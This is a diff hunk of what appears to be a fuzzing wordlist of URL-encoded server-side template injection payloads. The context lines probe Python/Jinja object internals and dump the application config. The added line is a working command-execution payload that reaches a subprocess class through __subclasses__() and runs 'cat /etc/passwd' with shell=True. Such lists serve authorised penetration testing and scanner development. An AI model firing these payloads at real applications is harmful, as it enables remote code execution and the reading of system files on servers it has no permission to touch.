@@ -13,6 +13,7 @@
 %7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A
 %7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A
 %7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A
+%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D
 %7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A
 %7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A
 %7B%7B%20request%20%7D%7D%0A
